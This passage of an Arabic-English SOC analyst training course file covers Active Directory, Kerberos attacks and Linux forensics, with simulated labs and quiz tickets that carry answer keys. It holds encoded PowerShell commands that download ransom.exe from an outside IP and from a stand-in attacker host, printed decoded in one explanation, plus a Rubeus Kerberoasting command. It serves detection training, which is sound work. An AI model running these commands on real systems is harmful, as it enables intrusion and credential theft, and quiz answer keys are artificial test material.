    <button class="btn-cmd" onclick="runSimCommand('decode-base64 aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAYwAyAC4AbwByAGcALwBzAC4AcABzADEAJwApAA==', 'lab-term-2-3')">Decode Malicious Sample</button>
    <button class="btn-cmd" onclick="runSimCommand('Get-ExecutionPolicy -List', 'lab-term-2-3')">Check Execution Policy</button>
  </div>
</div>
      `,
      labEn: `<p>Interactive PowerShell Base64 decoding and script block inspection.</p>`,
      ticket: {
        ticketId: "SEC-TICK-203",
        severity: "CRITICAL",
        severityClass: "critical",
        sourceHost: "DEV-WORKSTATION-19",
        timestamp: "2026-11-06 13:19:55 UTC",
        ruleTriggered: "POWERSHELL_SUSPICIOUS_ENCODED_COMMAND_EXECUTION",
        rawLog: `EventCode: 4688 (Process Creation with CommandLine Auditing)
Computer: DEV-WORKSTATION-19.corp.local
AccountName: CORP\\alex.dev
NewProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcgBhAG4AcwBvAG0ALgBlAHgAZQAnACwAJwBDADoAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA
ParentProcess: C:\\Windows\\System32\\cmd.exe (PID 9120)`,
        questionAr: "قم بفك تشفير الأمر المشفر بـ Base64 في سطر الأوامر أعلاه. ما هو التحليل الدقيق لما كان هذا الأمر يفعله سراً؟",
        questionEn: "Decode the Base64 command in the telemetry log. What was this command executing under the hood?",
        optionsAr: [
          "أمر تنظيف ملفات الكاش المؤقتة لويندوز.",
          "الأمر ينشئ كائن WebClient ويقوم بتنزيل ملف تنفيذي خبيث اسمه ransom.exe من الـ IP الخارجي 185.220.101.5 ويحفظه في C:\\Public\\payload.exe لتنفيذه!",
          "المبرمج أليكس يقوم بتنزيل تحديث لحزمة البرمجة الخاصة به من خادم مايكروسوفت.",
          "أمر روتيني لنسخ ملفات العمل الاحتياطية."
        ],
        optionsEn: [
          "Clearing temporary cache.",
          "Decodes to creating WebClient downloading ransom.exe from 185.220.101.5 and saving to C:\\Public\\payload.exe.",
          "Developer downloading legitimate library update.",
          "Standard backup routine."
        ],
        correctIndex: 1,
        explanationAr: "إتقان منقطع النظير يا باشمهندس بشار! عند فك تشفير السلسلة يظهر الأمر بوضوح تام: '$wc=New-Object System.Net.WebClient;$wc.DownloadFile(\\'http://185.220.101.5/ransom.exe\\',\\'C:\\\\Public\\\\payload.exe\\')'. هذا بايلود فدية حقيقي ومؤكد (True Positive) صادر باتجاه عنوان IP مشبوه. الإجراء: عزل الجهاز فوراً، فحص ما إذا كان الملف C:\\Public\\payload.exe قد بدأ بالتشفير، وحظر الـ IP الخارجي على الجدار الناري فوراً.",
        explanationEn: "Spot-on forensic decoding! The string decodes directly to WebClient downloading ransom.exe from external IP to C:\\Public\\payload.exe."
      }
    },

    {
      id: "lesson-2-4",
      moduleId: "module2",
      number: "2.4",
      titleAr: "الـ Active Directory من الصفر المطلق (الجزء الأول): الهيكلية، الدومين، والـ GPO",
      titleEn: "Active Directory from Absolute Zero (Part 1): Forests, Domains, OUs & GPO",
      duration: "70 min",
      theoryAr: `
<h3>عاصمة إمبراطورية مايكروسوفت في الشركات: لماذا اخترعوا الـ Active Directory؟</h3>
<p class="lead">تخيل شركة بها 10,000 موظف و 12,000 جهاز كمبيوتر وسيرفر. إذا جاء موظف جديد وأردت إنشاء حساب له على جميع الأجهزة، هل ستمر على 12,000 جهاز بالدور وتنشئ الحساب يدوياً؟! وإذا استقال موظف، هل ستمر على 12,000 جهاز لحذف حسابه؟! بالتأكيد هذه فوضى مستحيلة. من هنا وُلد الدليل النشط <strong>Active Directory (AD)</strong>!</p>

<div class="analogy-card">
  <div class="analogy-header">💡 تشبيه من الواقع: السجل المدني المركزي وجواز السفر الموحد</div>
  <p>في القرية الصغيرة، يعرف صاحب البقالة وجوه السكان بالاسم ولا يحتاج لبطاقات. ولكن في الدولة الضخمة، توجد وزارة داخلية مركزية (Domain Controller) تصدر بطاقة رقم قومي موحدة لكل مواطن (User Account). بهذه البطاقة، يستطيع المواطن استئجار شقة، فتح حساب بنكي، ودخول الدوائر الحكومية (Single Sign-On). إذا أوقفت وزارة الداخلية بطاقة شخص ما، تتوقف جميع معاملاته في كل أنحاء الدولة في نفس الثانية!</p>
  <p>هذا هو الـ Active Directory: قاعدة بيانات مركزية تدير هويات الموظفين، أجهزة الحاسوب، الطابعات، الصلاحيات، وسياسات الأمان في شبكة الشركة من مكان واحد مركزي.</p>
</div>

<h4>1. المصطلحات الأساسية في هيكل الـ Active Directory (المعجم الإلزامي):</h4>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>المصطلح</th>
        <th>الاسم الإنجليزي</th>
        <th>المعنى الهندسي المبسط</th>
        <th>أهميته لمحلل الـ SOC</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>متحكم النطاق</strong></td>
        <td>Domain Controller (DC)</td>
        <td>السيرفر المركزي (قلعة القلعة!) الذي يشغل خدمات الـ Active Directory، ويحتفظ بقاعدة بيانات الحسابات وكلمات المرور (ملف <code>NTDS.dit</code>)، ويوثق دخول الجميع عبر Kerberos.</td>
        <td><strong>الكأس المقدسة للهكر (Holy Grail)!</strong> إذا سقط الـ DC، سقطت الشركة بالكامل تحت رحمة المهاجم.</td>
      </tr>
      <tr>
        <td><strong>النطاق</strong></td>
        <td>Domain</td>
        <td>الحدود الأمنية والإدارية المشتركة لمجموعة من الأجهزة والمستخدمين (مثال: <code>corp.local</code> أو <code>basharsec.com</code>).</td>
        <td>يحدد مساحة إدارة الحسابات والسياسات الأمنية.</td>
      </tr>
      <tr>
        <td><strong>الشجرة والغابة</strong></td>
        <td>Tree & Forest</td>
        <td><strong>Tree:</strong> مجموعة نطاقات تشترك في نفس النطاق الرئيسي.<br><strong>Forest:</strong> الحدود الأمنية القصوى في مايكروسوفت؛ تجمع عدة نطاقات تربطها علاقات ثقة (Trust Relationships).</td>
        <td>المهاجم الذي يسيطر على Domain Admin في فرع قد يستغل علاقات الثقة للقفز إلى الغابة بالكامل (Enterprise Admin).</td>
      </tr>
      <tr>
        <td><strong>الوحدات التنظيمية</strong></td>
        <td>Organizational Units (OUs)</td>
        <td>مجلدات داخل الدومين لترتيب المستخدمين والأجهزة حسب الأقسام (مثل: OU=Finance, OU=HR, OU=IT).</td>
        <td>تُطبق عليها سياسات الأمان (GPO)؛ يسهل على المحلل معرفة قسم الموظف من اسم الـ OU.</td>
      </tr>
      <tr>
        <td><strong>كائنات سياسة المجموعة</strong></td>
        <td>Group Policy Objects (GPO)</td>
        <td>القرارات والقوانين المركزية الإلزامية التي يفرضها مدير النظام على جميع الأجهزة (مثل: إجبار خلفية شاشة معينة، منع تشغيل الفلاشات USB، فرض تعقيد كلمات المرور).</td>
        <td>يستغلها الهكر لنشر برمجيات الفدية (Ransomware) على آلاف الأجهزة في دقيقة واحدة بمجرد اختراق الـ DC!</td>
      </tr>
    </tbody>
  </table>
</div>

<h4>2. قاعدة بيانات الدليل النشط (ملف NTDS.dit):</h4>
<p>هو الملف الأثمن والأخطر في تاريخ أي شركة! يوجد في المسار <code>C:\\Windows\\NTDS\\NTDS.dit</code> على خادم الـ Domain Controller فقط. يحتوي على أسماء جميع موظفي الشركة مع هاشات كلمات المرور الخاصة بهم (NTLM Hashes). الوصول لهذا الملف يعني انتهاء اللعبة لصالح المهاجم (DCSync Attack)!</p>

<h4>3. مجموعات الصلاحيات العالية (Privileged Groups):</h4>
<ul>
  <li><code>Domain Admins:</code> مديرو الدومين المحلي (تحكم كامل بجميع أجهزة ومستخدمي النطاق).</li>
  <li><code>Enterprise Admins:</code> أعلى سلطة في الغابة بالكامل (يملكون كل النطاقات التابعة).</li>
  <li><code>Schema Admins:</code> المتحكمون في هيكل قاعدة بيانات الدليل النشط.</li>
</ul>
<p>القاعدة الذهبية لمحلل الـ SOC: أي إضافة لمستخدم في مجموعة <strong>Domain Admins</strong> تُسجل في الحدث <strong>Event ID 4728</strong> وتتطلب تنبيهاً فورياً وتدقيقاً أمنياً طارئاً!</p>
      `,
      theoryEn: `<h3>Active Directory Fundamentals: Forests, Domains, DCs, OUs, NTDS.dit & GPO</h3>`,
      attackDefenseAr: `
<h3>منظور المهاجم والمدافع: الاستطلاع والسيطرة على الدليل النشط</h3>
<div class="battle-grid">
  <div class="attacker-side">
    <h4>🔴 كيف يستكشف الهكر الـ Active Directory؟</h4>
    <ul>
      <li><strong>الاستطلاع عبر بروتوكول LDAP:</strong> استخدام أدوات مثل BloodHound و SharpHound لرسم خريطة بيانية لجميع مستخدمي الشركة، مدراء النطاق، وأقصر مسار للوصول إلى Domain Admin!</li>
      <li><strong>نشر الهجمات عبر الـ GPO:</strong> إذا حصل المهاجم على صلاحيات كافية لتعديل الـ GPO، فإنه يقوم بإنشاء سياسة خبيثة تقوم بتثبيت الفايروس على كل لابتوبات الموظفين عند أول تسجيل دخول!</li>
    </ul>
  </div>
  <div class="defender-side">
    <h4>🟢 خط دفاع محلل الـ SOC</h4>
    <ul>
      <li><strong>مراقبة استعلامات LDAP المشبوهة:</strong> رصد محاولات سحب بيانات جميع المستخدمين والكمبيوترات في وقت قصير عبر أدوات استطلاع الهكر.</li>
      <li><strong>مراقبة التعديل على سياسات الـ GPO (Event ID 5136):</strong> تدقيق أي تعديل يطرأ على سياسات المجموعة المركزية والتأكد من وجود تذكرة تغيير معتمدة (Change Request).</li>
    </ul>
  </div>
</div>
      `,
      attackDefenseEn: `<h3>Attacker vs Defender: Active Directory Reconnaissance (BloodHound) vs GPO Auditing</h3>`,
      labAr: `
<div class="lab-workspace">
  <div class="lab-instructions">
    <h4>🧪 المعمل التطبيقي 2.4: استكشاف مستخدمي ومجموعات الـ Active Directory</h4>
    <p>استخدم أوامر net user و dsquery للتعرف على مستخدمي الدومين والتحقق من أعضاء Domain Admins.</p>
  </div>
  <div class="terminal-box">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> basharsec@soc-workstation:~$</div>
    <div class="terminal-body" id="lab-term-2-4">
      <div class="term-line output">Active Directory Management Console</div>
      <div class="term-line output">Type 'net user /domain' or 'net group "Domain Admins" /domain'.</div>
    </div>
  </div>
  <div class="quick-commands">
    <button class="btn-cmd" onclick="runSimCommand('net user /domain', 'lab-term-2-4')">List Domain Users</button>
    <button class="btn-cmd" onclick="runSimCommand('net group &quot;Domain Admins&quot; /domain', 'lab-term-2-4')">Inspect Domain Admins Group</button>
  </div>
</div>
      `,
      labEn: `<p>Interactive Active Directory user enumeration and admin group inspection.</p>`,
      ticket: {
        ticketId: "SEC-TICK-204",
        severity: "CRITICAL",
        severityClass: "critical",
        sourceHost: "DC01.corp.local",
        timestamp: "2026-11-06 15:40:12 UTC",
        ruleTriggered: "AD_SECURITY_EVENT_4728_MEMBER_ADDED_TO_DOMAIN_ADMINS",
        rawLog: `Event: Windows Security Log (EventID: 4728)
TimeCreated: 2026-11-06 15:40:12.890
Computer: DC01.corp.local
TargetUserName: Domain Admins
TargetSid: S-1-5-21-3948572910-4829102-1002-512
MemberName: CN=temp_contractor_backup,OU=Contractors,DC=corp,DC=local
SubjectUserName: b.hafedh_admin (IT Admin Account)
CallerProcessName: C:\\Windows\\System32\\cmd.exe (Via PsExec Remote Session)`,
        questionAr: "تلقيت تنبيهاً أمنياً بالحدث 4728 يوثق إضافة مستخدم مقاول مؤقت (temp_contractor_backup) إلى مجموعة Domain Admins عبر جلسة PsExec. ما هو التقييم الأمني الفوري؟",
        questionEn: "Analyze the Event 4728 alert adding a temporary contractor to Domain Admins via PsExec. What is your assessment?",
        optionsAr: [
          "إجراء روتيني طبيعي لمنح المقاولين صلاحية الوصول للطابعات.",
          "حادث أمني حرج جداً P1 (Potential Privilege Escalation): ترقية حساب مقاول لمجموعة مدراء النطاق Domain Admins عبر PsExec يتطلب فوراً التحقق من المهندس بشار (b.hafedh_admin) عما إذا كان قد نفذ هذا التغيير أو أن حسابه تعرض للاختراق، وتعطيل الحساب مؤقتاً.",
          "خطأ في خادم DNS أدى لإضافة الحساب بالخطأ.",
          "تحديث مجدول لقاعدة بيانات NTDS.dit."
        ],
        optionsEn: [
          "Routine change for printer access.",
          "P1 Critical Security Incident: Unauthorized privilege escalation adding contractor to Domain Admins via PsExec. Verify account compromise immediately.",
          "DNS server error.",
          "Routine NTDS.dit compaction."
        ],
        correctIndex: 1,
        explanationAr: "إجراء قيادي في الصميم يا باشمهندس بشار! إضافة أي عضو لمجموعة مدراء النطاق (Domain Admins) هي الحادث الأمني الأكثر حساسية في الـ SOC. الحساب المضاف هو حساب مقاول مؤقت، وتمت العملية عبر أداة PsExec (المستخدمة في الحركة الجانبية). يجب فوراً الاتصال بالمسؤول b.hafedh_admin للتأكد: هل تعرض حسابه لسرقة الهاش واستخدمه الهكر لترقية حساب خلفي، أم أنه إجراء معتمد؟ مع سحب الصلاحية فوراً حتى استكمال التحقيق.",
        explanationEn: "Spot-on! Event 4728 on Domain Admins executed remotely via PsExec requires immediate priority 1 incident escalation to rule out adversary credential compromise."
      }
    },

    {
      id: "lesson-2-5",
      moduleId: "module2",
      number: "2.5",
      titleAr: "الـ Active Directory (الجزء الثاني): التوثيق بـ Kerberos و NTLM وهجمات التذاكر",
      titleEn: "Active Directory (Part 2): Kerberos Authentication, NTLM & Ticket Attacks",
      duration: "70 min",
      theoryAr: `
<h3>حارس البوابة ذو الرؤوس الثلاثة: كيف تسجل دخولك في الشركة دون إرسال كلمة المرور؟</h3>
<p class="lead">في بيئة العمل المؤسسية، لا يرسل جهازك كلمة المرور إلى الخوادم كلما أردت فتح ملف أو طباعة ورقة، لأن هذا سيعرض كلمة المرور للتنصت والسرقة في كل لحظة. بدلاً من ذلك، ابتكرت مايكروسوفت ومعهد MIT بروتوكول التوثيق العبقري <strong>Kerberos (المنفذ 88)</strong> القائم على نظام "التذاكر الرقمية المشفرة".</p>

<div class="analogy-card">
  <div class="analogy-header">💡 تشبيه من الواقع: مدينة الملاهي وتذاكر الألعاب</div>
  <p>عندما تذهب إلى مدينة ملاهي ضخمة (Disneyland):
  1. تذهب أولاً إلى <strong>شباك التذاكر الرئيسي عند البوابة (Authentication Service - AS)</strong>، وتبرز هويتك وتدفع المال.
  2. يعطيك شباك التذاكر <strong>إسوارة دخول عامة للمدينة (تذكرة TGT - Ticket Granting Ticket)</strong>.
  3. عندما تريد ركوب قطار الموت السريع، لا تبرز هويتك ولا تدفع مالاً لقطار الموت مباشرة؛ بل تذهب إلى <strong>مكتب ألعاب الإثارة (Ticket Granting Service - TGS)</strong> وتبرز إسوارة الدخول، فيعطيك <strong>تذكرة خاصة بقطار الموت فقط (Service Ticket - TGS)</strong>!
  4. تذهب لقطار الموت وتقدم تذكرة اللعبة فتركب فوراً دون أن يعرف سائق القطار من أنت ولا كم دفعت!</p>
</div>

<h4>مراحل توثيق Kerberos الست خطوة بخطوة (Under the Hood):</h4>

<pre class="ascii-flow">
العميل (الموظف)                 متحكم النطاق (KDC / Domain Controller)               خادم المورد (File Server)
     │                                        │                                       │
     │ ── 1. AS-REQ (طلب تذكرة الدخول) ────> │ (أنا الموظف بشار، أريد TGT)           │
     │                                        │                                       │
     │ <── 2. AS-REP (إرسال تذكرة TGT) ───── │ (تفضل تذكرة TGT مشفرة بمفتاح KDC)     │
     │                                        │                                       │
     │ ── 3. TGS-REQ (طلب تذكرة خدمة) ─────> │ (أحمل TGT وأريد تذكرة لخادم الملفات)  │
     │                                        │                                       │
     │ <── 4. TGS-REP (إرسال تذكرة الخدمة) ─ │ (تفضل تذكرة الخدمة مشفرة بهاش الخادم) │
     │                                        │                                       │
     │ ── 5. AP-REQ (تقديم تذكرة الخدمة) ───────────────────────────────────────────> │
     │                                                                                │
     │ <── 6. AP-REP (السماح بالوصول للملفات وقبول الجلسة) ────────────────────────── │
</pre>

<h4>أخطر هجمات الـ Active Directory التي ستحقق فيها في الـ SOC:</h4>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>اسم الهجوم</th>
        <th>فكرة الهجوم التقنية</th>
        <th>رقم حدث ويندوز الكاشف</th>
        <th>كيف يصطاده محلل الـ SOC؟</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Kerberoasting</strong></td>
        <td>يقوم المهاجم (بأي حساب موظف عادي) بطلب تذكرة خدمة TGS لحساب خدمة يملك SPN (Service Principal Name)، ويحصل على التذكرة المشفرة بهاش حساب الخدمة، ثم يأخذها خارج الشبكة ليكسرها بدون اتصال (Offline Brute Force) بواسطة Hashcat لاستخراج كلمة المرور!</td>
        <td><strong>Event ID 4769</strong> (A Kerberos service ticket was requested)</td>
        <td>رصد طلب تذاكر TGS تطلب تشفير <code>0x17</code> (RC4-HMAC الضعيف) لحسابات ذات صلاحيات عالية، أو طلب عشرات التذاكر دفعة واحدة في ثوانٍ.</td>
      </tr>
      <tr>
        <td><strong>AS-REP Roasting</strong></td>
        <td>استهداف حسابات تم إلغاء خاصية التوثيق المسبق لها (Do not require Kerberos preauthentication). يطلب المهاجم تذكرة AS-REP مباشرة دون تقديم كلمة مرور، فيرد السيرفر ببيانات مشفرة بكلمة مرور الحساب ليكسرها خارجياً.</td>
        <td><strong>Event ID 4768</strong> (A Kerberos authentication ticket TGT was requested)</td>
        <td>طلب تذاكر TGT بنوع تشفير مسبق <code>Pre-Auth Type: 0</code> لحسابات المستخدمين.</td>
      </tr>
      <tr>
        <td><strong>Pass-The-Hash (PtH)</strong></td>
        <td>في بروتوكول NTLM، لا يحتاج المهاجم لمعرفة كلمة المرور الأصلية كنص واضح؛ بل يكفيه سرقة الهاش (NTLM Hash) من ذاكرة LSASS واستخدامه مباشرة لتسجيل الدخول في أجهزة أخرى عبر الشبكة!</td>
        <td><strong>Event ID 4624</strong> (مع LogonType = 3 ونوع التوثيق NTLM)</td>
        <td>رصد تسجيل دخول شبكي NTLM صادر من محطة عمل لم تستخدم Kerberos.</td>
      </tr>
      <tr>
        <td><strong>Golden Ticket</strong></td>
        <td>الهجوم الكارثي المطلق! إذا نجح المهاجم في سرقة هاش حساب <code>krbtgt</code> (الحساب المشفر لجميع تذاكر الدومين)، فإنه يستطيع تزوير تذكرة TGT لنفسه تمنحه صلاحية Enterprise Admin وتعمل لمدة 10 سنوات ولا يمكن للسيرفر رفضها!</td>
        <td><strong>Event ID 4624 / 4672</strong></td>
        <td>ظهور تذاكر TGT بمدد صلاحية شاذة (مثل 10 سنوات بدلاً من 10 ساعات الافتراضية).</td>
      </tr>
    </tbody>
  </table>
</div>
      `,
      theoryEn: `<h3>Kerberos Authentication Protocol Deep Dive: Tickets, NTLM & Attack Vectors</h3>`,
      attackDefenseAr: `
<h3>منظور المهاجم والمدافع: صيد هجمات التذاكر في السجلات</h3>
<div class="battle-grid">
  <div class="attacker-side">
    <h4>🔴 ترسانة الهكر لاختراق Kerberos</h4>
    <ul>
      <li><strong>استخدام أدوات Rubeus و Mimikatz:</strong> تشغيل أمر: <code>Rubeus.exe kerberoast /outfile:hashes.txt</code> لطلب وسحب تذاكر جميع حسابات الـ SPN في ثوانٍ معدودة بهدوء تام!</li>
      <li><strong>إجبار التشفير الضعيف (Downgrade Attack):</strong> إجبار السيرفر على استخدام تشفير RC4 بدلاً من AES256 لأن RC4 سهل الكسر جداً ببطاقات الشاشة الحديثة في دقائق معدودة.</li>
    </ul>
  </div>
  <div class="defender-side">
    <h4>🟢 خط دفاع محلل الـ SOC</h4>
    <ul>
      <li><strong>تنبيهات الـ SIEM لـ Event 4769:</strong> إنشاء قاعدة في Splunk ترصد: <code>EventCode=4769 Ticket_Encryption_Type=0x17</code> لحسابات الخدمات الحساسة.</li>
      <li><strong>تطبيق كلمات مرور معقدة (+25 حرفاً) لحسابات الخدمة (gMSA):</strong> استخدام Group Managed Service Accounts لحسابات الخدمات يجعل كسرها مستحيلاً رياضياً حتى لو سُرقت التذكرة.</li>
    </ul>
  </div>
</div>
      `,
      attackDefenseEn: `<h3>Attacker vs Defender: Kerberoasting Mechanics vs Event 4769 Detection</h3>`,
      labAr: `
<div class="lab-workspace">
  <div class="lab-instructions">
    <h4>🧪 المعمل التطبيقي 2.5: فحص تذاكر Kerberos النشطة عبر أداة klist</h4>
    <p>استخدم أداة klist في ويندوز لعرض التذاكر المخزنة في الذاكرة وفحص نوع التشفير ونوع التذكرة.</p>
  </div>
  <div class="terminal-box">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> basharsec@soc-workstation:~$</div>
    <div class="terminal-body" id="lab-term-2-5">
      <div class="term-line output">Kerberos Ticket Telemetry Inspector</div>
      <div class="term-line output">Type 'klist' to view cached tickets or 'klist purge' to clear tickets.</div>
    </div>
  </div>
  <div class="quick-commands">
    <button class="btn-cmd" onclick="runSimCommand('klist', 'lab-term-2-5')">klist (View Cached Kerberos Tickets)</button>
    <button class="btn-cmd" onclick="runSimCommand('klist tgt', 'lab-term-2-5')">klist tgt (Inspect TGT Parameters)</button>
  </div>
</div>
      `,
      labEn: `<p>Interactive Kerberos ticket inspection using klist commands.</p>`,
      ticket: {
        ticketId: "SEC-TICK-205",
        severity: "HIGH",
        severityClass: "high",
        sourceHost: "DC01.corp.local",
        timestamp: "2026-11-06 17:02:18 UTC",
        ruleTriggered: "SIEM_KERBEROASTING_SUSPICIOUS_RC4_TGS_REQUEST",
        rawLog: `Event: Windows Security Log (EventID: 4769)
Computer: DC01.corp.local
TargetUserName: mssql_svc@corp.local
ServiceName: MSSQLSvc/sql-prod-01.corp.local:1433
TicketOptions: 0x40810000
TicketEncryptionType: 0x17 (RC4-HMAC)
IpAddress: 10.140.30.55 (Workstation: WKSTN-DEV-08)
IpPort: 52194
Status: 0x0 (Success)
Frequency: 24 similar requests from same host targeting distinct SPNs in 45 seconds`,
        questionAr: "تفحص سجل الحدث 4769 أعلاه الصادر من محطة WKSTN-DEV-08. ما نوع الهجوم الجاري تنفيذه ولماذا يُعتبر نوع التشفير 0x17 دليلاً حاسماً؟",
        questionEn: "Analyze the Event 4769 log above. What attack is occurring and why is encryption type 0x17 decisive?",
        optionsAr: [
          "طلب اتصال روتيني بقاعدة بيانات SQL من برنامج التطوير.",
          "هجوم Kerberoasting مؤكد: الجهاز WKSTN-DEV-08 يقوم بسحب تذاكر TGS لحسابات خدمات SPN مع إجبار تشفير RC4 الضعيف (0x17) لتسهيل كسر كلمات المرور بدون اتصال بواسطة Hashcat!",
          "المستخدم نسي كلمة المرور ويحاول استعادتها.",
          "خطأ في إعدادات المنفذ 1433."
        ],
        optionsEn: [
          "Routine SQL connection request.",
          "Confirmed Kerberoasting attack requesting TGS tickets with legacy RC4 (0x17) encryption across 24 SPNs for offline cracking.",
          "User password reset request.",
          "Port 1433 configuration glitch."
        ],
        correctIndex: 1,
        explanationAr: "تحليل نخبوي ودقيق 100% يا باشمهندس بشار! هذا النمط هو التوقيع الكلاسيكي لهجوم Kerberoasting: 1) طلب تذكرة خدمة TGS لحساب خدمة SQL ذي صلاحية عالية. 2) استخدام تشفير RC4 (0x17) القديم الذي يطلبه الهكر عمداً لتسهيل الكسر. 3) تكرار الطلب لـ 24 حساب خدمة مختلف في 45 ثانية بواسطة أداة آلية مثل Rubeus. الإجراء: عزل الجهاز 10.140.30.55، وتغيير كلمات مرور حسابات الخدمات المستهدفة فوراً بكلمات مرور معقدة (+25 حرفاً).",
        explanationEn: "Spot on! 24 burst requests for SPN tickets with RC4 (0x17) encryption from a developer workstation is the classic signature of an automated Kerberoasting attack."
      }
    },

    {
      id: "lesson-2-6",
      moduleId: "module2",
      number: "2.6",
      titleAr: "نظام Linux من الصفر للمحلل: هيكلية الملفات والصلاحيات وأهم 30 أمراً جنائياً",
      titleEn: "Linux from Scratch for Cyber Analysts: Filesystem, Permissions & 30 Essential Commands",
      duration: "70 min",
      theoryAr: `
<h3>أرض الخوادم والحاويات: كيف تقود نظام Linux كمحلل أمني محترف؟</h3>
<p class="lead">أكثر من 90% من خوادم الويب، الحاويات السحابية (Docker / Kubernetes)، وأجهزة الجدران النارية والـ SIEM في العالم تعمل بنظام <strong>Linux</strong>! إذا كنت لا تستطيع فتح التيرمينال وفحص السجلات واستخراج الأدلة الجنائية بأوامر سريعة، فستكون نصف أعمى في مركز العمليات الأمنية.</p>

<div class="analogy-card">
  <div class="analogy-header">💡 تشبيه من الواقع: الشجرة المقلوبة ذات الجذور الموحدة</div>
  <p>في نظام ويندوز، لكل قرص حرف خاص به (مثل <code>C:</code> و <code>D:</code>). أما في لينكس، فكل شيء في الكون ينبثق من نقطة أصل واحدة تسمى <strong>الجذر (Root Directory <code>/</code>)</strong>! وتحته تتفرع المجلدات كأغصان الشجرة. وفوق ذلك، القاعدة الذهبية في لينكس هي: <em>"كل شيء عبارة عن ملف (Everything is a file)"</em>: لوحة المفاتيح ملف، الشاشة ملف، حتى اتصالات الشبكة والعمليات تُقرأ كملفات نصية!</p>
</div>

<h4>1. خريطة مجلدات لينكس الحيوية لمحلل الـ SOC:</h4>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>المسار في لينكس</th>
        <th>ماذا يحتوي هذا المجلد؟</th>
        <th>أهميته في التحقيق الأمني وصيد التهديدات</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><code>/etc</code></td>
        <td>ملفات تكوين وإعدادات النظام والبرامج (Configurations).</td>
        <td>يحتوي على ملف المستخدمين <code>/etc/passwd</code> وملف كلمات المرور المشفرة <code>/etc/shadow</code> وملفات المهام المجدولة <code>/etc/crontab</code>.</td>
      </tr>
      <tr>
        <td><code>/var/log</code></td>
        <td><strong>منجم الذهب لمحلل الـ SOC!</strong> مجلد حفظ جميع سجلات النظام والخدمات.</td>
        <td>يحتوي على سجلات الدخول والمصادقة <code>auth.log</code> أو <code>secure</code>، وسجلات خوادم الويب <code>/var/log/nginx/</code> و <code>apache2/</code>.</td>
      </tr>
      <tr>
        <td><code>/tmp</code> و <code>/var/tmp</code></td>
        <td>المجلدات المؤقتة ذات الصلاحية المفتوحة للجميع بالكتابة (World-writable).</td>
        <td><strong>الملاذ الأول للهكر!</strong> المكان الذي يرفع فيه المهاجم أدواته الخبيثة والـ Payloads وسكربتات تصعيد الصلاحيات لأن أي مستخدم يستطيع الكتابة فيه.</td>
      </tr>
      <tr>
        <td><code>/proc</code></td>
        <td>نظام ملفات وهمي مقيم في الذاكرة يمثل العمليات الشغالة في النظام مباشرة.</td>
        <td>فحص العمليات الخفية عبر معرفاتها (مثل <code>/proc/[PID]/cmdline</code> لمعرفة سطر الأوامر الحقيقي للعملية).</td>
      </tr>
      <tr>
        <td><code>/home</code> و <code>/root</code></td>
        <td>المجلدات الشخصية للمستخدمين العاديين ولمدير النظام Root.</td>
        <td>فحص ملفات تاريخ الأوامر <code>~/.bash_history</code> لمعرفة الأوامر التي كتبها المستخدم أو المهاجم باليد!</td>
      </tr>
    </tbody>
  </table>
</div>

<h4>2. نظام الصلاحيات في لينكس (Permissions: Read, Write, Execute):</h4>
<p>كل ملف ومجلد له مالك (Owner) ومجموعة (Group) ومستوى أمان يتكون من 3 أقسام:</p>
<pre class="ascii-flow">
  -  r w x  r - x  r - -
  │  └──┬──┘ └──┬──┘ └──┬──┘
  │     │       │       └── صلاحيات باقي العالم (Others: Read Only = 4)
  │     │       └────────── صلاحيات أعضاء المجموعة (Group: Read + Execute = 5)
  │     └────────────────── صلاحيات المالك الأصلي (Owner: Read + Write + Execute = 7)
  └──────────────────────── نوع الملف (- تعني ملف عادي، d تعني مجلد Directory)
</pre>
<p>الأرقام الحسابية: <strong>Read (r) = 4</strong> | <strong>Write (w) = 2</strong> | <strong>Execute (x) = 1</strong>. أمر <code>chmod 755 file</code> يعني إعطاء المالك كامل الصلاحيات (7) والباقي قراءة وتنفيذ فقط (5).</p>

<h4>3. أهم 10 أوامر جنائية لا يستغني عنها أي محلل SOC في لينكس:</h4>
<ul>
  <li><code>grep -ri "failed" /var/log/auth.log:</code> البحث السريع عن محاولات تسجيل الدخول الفاشلة عبر SSH.</li>
  <li><code>awk '{print $1}' access.log | sort | uniq -c | sort -nr:</code> استخراج وتصنيف أكثر عناوين الـ IP التي زارت خادمك وتكرار كل عنوان (لكشف الـ Scanners و DoS).</li>
  <li><code>find / -perm -4000 -type f 2>/dev/null:</code> البحث عن ملفات الـ SUID الحساسة (التي قد تمنح المهاجم صلاحية Root مباشرة).</li>
  <li><code>netstat -tunap أو ss -tulpn:</code> عرض جميع الاتصالات المفتوحة والمستمعة في السيرفر مع الـ PID.</li>
  <li><code>ps auxf:</code> عرض شجرة العمليات في لينكس لمعرفة الأب والأبناء.</li>
  <li><code>last -n 20:</code> استعراض آخر 20 مستخدم سجلوا دخولهم للنظام وأوقات الجلسات وعناوينهم.</li>
  <li><code>crontab -l:</code> فحص المهام المجدولة الخاصة بالمستخدمين.</li>
  <li><code>cat /etc/passwd | grep -v "nologin":</code> عرض المستخدمين الحقيقيين الذين يملكون واجهة دخول فعلية للنظام.</li>
